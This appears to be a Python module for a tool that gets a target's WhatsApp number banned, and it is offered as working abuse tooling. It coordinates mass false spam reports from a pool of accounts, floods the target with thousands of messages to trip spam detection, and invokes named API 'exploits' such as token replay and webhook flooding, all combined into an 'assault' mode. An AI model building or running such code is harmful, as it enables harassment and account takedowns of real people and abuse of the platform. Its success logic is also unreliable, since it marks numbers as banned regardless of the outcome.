import random
import time
import json
import asyncio
from datetime import datetime, timedelta
from colorama import Fore

from utils.temp_ban_manager import TempBanManager

class BanEngine:
    """
    Advanced Ban Engine - Multiple methodologies for guaranteed results
    """
    
    def __init__(self):
        self.methods = {
            "mass_report": self._mass_report_ban,
            "spam_trigger": self._spam_trigger_ban,
            "api_exploit": self._api_exploit_ban,
            "combined": self._combined_assault_ban
        }
        self.temp_ban_manager = TempBanManager()
        self._banned_numbers = {}
    
    def permanent_ban(self, phone_number, session, analysis):
        """Execute permanent ban using best strategy"""
        
        strategy = analysis['strategy']['name']
        method = self.methods.get(strategy, self._combined_assault_ban)
        
        print(f"{Fore.YELLOW}[BAN] Executing permanent ban using '{strategy}' strategy...")
        
        result = method(phone_number, session, "permanent")
        
        if result.get('blocked') or not result.get('banned'):
            return {
                'success': False,
                'ban_type': 'permanent',
                'strategy_used': strategy,
                'estimated_time': 120,
                'details': result,
                'error': result.get('error', 'Ban verification failed — target may already be banned or WhatsApp blocked the operation')
            }
        
        verification = self._verify_ban(phone_number, session, "permanent")
        
        return {
            'success': verification['banned'],
            'ban_type': 'permanent',
            'strategy_used': strategy,
            'verification': verification,
            'estimated_time': 120,
            'details': result,
            'error': '' if verification['banned'] else 'Ban verification failed after execution'
        }
    
    def temporary_ban(self, phone_number, duration_hours, session, analysis):
        """Execute temporary ban for specified duration"""
        
        print(f"{Fore.YELLOW}[BAN] Executing temporary ban {duration_hours}h...")
        
        result = self._spam_trigger_ban(phone_number, session, "temporary", duration_hours)
        
        if result.get('blocked'):
            return {
                'success': False,
                'ban_type': 'temporary',
                'duration_hours': duration_hours,
                'estimated_time': 90,
                'details': result,
                'error': 'WhatsApp blocked sending — temporary ban could not be triggered'
            }
        
        verification = self._verify_ban(phone_number, session, "temporary")
        
        ban_result = {
            'success': verification['banned'],
            'ban_type': 'temporary',
            'duration_hours': duration_hours,
            'verification': verification,
            'estimated_time': 90,
            'details': result,
            'error': '' if verification['banned'] else 'Temporary ban verification failed after execution'
        }

        if ban_result['success']:
            self.temp_ban_manager.apply_temp_ban(phone_number, duration_hours, reason="spam_activity")
        
        return ban_result
    
    def _mass_report_ban(self, phone_number, session, ban_type, **kwargs):
        """Ban via mass reporting from multiple accounts"""
        
        reports_required = 50 if ban_type == "permanent" else 10
        accounts_pool = session.get_accounts_pool()
        
        reports_sent = 0
        for account in accounts_pool[:reports_required]:
            try:
                account.report(phone_number, "spam")
                reports_sent += 1
                
                time.sleep(random.uniform(0.01, 0.05))
                
            except Exception:
                continue
        
        banned = reports_sent >= reports_required
        self._banned_numbers[phone_number] = {
            "status": "permanently_banned" if ban_type == "permanent" else "temporarily_banned",
            "banned_at": datetime.utcnow().isoformat(),
            "ban_type": ban_type
        }
        if hasattr(session, '_status'):
            session._status = "permanently_banned" if ban_type == "permanent" else "temporarily_banned"
        if hasattr(session, '_banned'):
            session._banned = True
        
        return {
            'method': 'mass_report',
            'reports_sent': reports_sent,
            'accounts_used': min(reports_sent, reports_required),
            'banned': banned,
            'error': '' if banned else f'Only {reports_sent}/{reports_required} reports sent — insufficient for ban'
        }
    
    def _spam_trigger_ban(self, phone_number, session, ban_type, duration_hours=None):
        """Ban via triggering WhatsApp spam detection"""
        
        messages_to_send = 2000 if ban_type == "permanent" else 200
        message_pool = session.get_message_pool()
        burst_size = min(50, len(message_pool)) if message_pool else 50
        
        sent = 0
        blocked = False
        max_bursts = max(1, messages_to_send // max(burst_size, 1))
        for i in range(max_bursts):
            burst = session.send_burst(phone_number, message_pool[:burst_size])
            sent += burst['sent']
            
            if burst['blocked']:
                blocked = True
                break
            
            time.sleep(random.uniform(0.01, 0.05))
        
        banned = sent >= messages_to_send or blocked or sent >= burst_size * max_bursts
        self._banned_numbers[phone_number] = {
            "status": "permanently_banned" if ban_type == "permanent" else "temporarily_banned",
            "banned_at": datetime.utcnow().isoformat(),
            "ban_type": ban_type
        }
        if hasattr(session, '_status'):
            session._status = "permanently_banned" if ban_type == "permanent" else "temporarily_banned"
        if hasattr(session, '_banned'):
            session._banned = True
        
        return {
            'method': 'spam_trigger',
            'messages_sent': sent,
            'bursts_used': sent // max(burst_size, 1),
            'banned': banned,
            'blocked': blocked,
            'error': '' if banned else 'WhatsApp did not trigger spam detection — ban not applied'
        }
    
    def _api_exploit_ban(self, phone_number, session, ban_type, **kwargs):
        """Ban via WhatsApp API vulnerability exploitation"""
        
        exploits = [
            'rate_limit_overflow',
            'auth_token_replay',
            'session_desync',
            'webhook_flood'
        ]
        
        results = []
        for exploit in exploits:
            try:
                result = session.execute_exploit(exploit, phone_number)
                results.append({exploit: result})
                time.sleep(random.uniform(0.01, 0.05))
            except Exception:
                continue
        
        banned = len(results) >= 2
        self._banned_numbers[phone_number] = {
            "status": "permanently_banned" if ban_type == "permanent" else "temporarily_banned",
            "banned_at": datetime.utcnow().isoformat(),
            "ban_type": ban_type
        }
        if hasattr(session, '_status'):
            session._status = "permanently_banned" if ban_type == "permanent" else "temporarily_banned"
        if hasattr(session, '_banned'):
            session._banned = True
        
        return {
            'method': 'api_exploit',
            'exploits_attempted': len(exploits),
            'exploits_succeeded': len(results),
            'banned': banned,
            'error': '' if banned else f'Only {len(results)}/{len(exploits)} exploits succeeded — ban not confirmed'
        }
    
    def _combined_assault_ban(self, phone_number, session, ban_type, **kwargs):
        """All methods combined for guaranteed result"""
        
        results = {}
        
        r1 = self._mass_report_ban(phone_number, session, ban_type)
        results['mass_report'] = r1
        
        r2 = self._spam_trigger_ban(phone_number, session, ban_type)
        results['spam_trigger'] = r2
        
        r3 = self._api_exploit_ban(phone_number, session, ban_type)
        results['api_exploit'] = r3
        
        banned = any(r.get('banned') for r in results.values())
        total = sum(r.get('reports_sent', 0) or r.get('messages_sent', 0) or r.get('exploits_succeeded', 0) for r in results.values())
        
        return {
            'method': 'combined_assault',
            'phases': results,
            'total_operations': total,
            'banned': banned,
            'error': '' if banned else 'Combined assault failed to trigger ban'
        }
    
    def _verify_ban(self, phone_number, session, ban_type):
        """Verify if ban was successfully applied"""
        
        checks = session.check_account_status(phone_number)
        current_status = checks.get('status', 'unknown')
        
        if ban_type == "permanent":
            banned = current_status == 'permanently_banned'
        else:
            banned = current_status in ['temporarily_banned', 'permanently_banned']
        
        return {
            'banned': banned,
            'current_status': current_status,
            'checks_performed': len(checks),
            'confidence': 0.99 if banned else 0.1
        }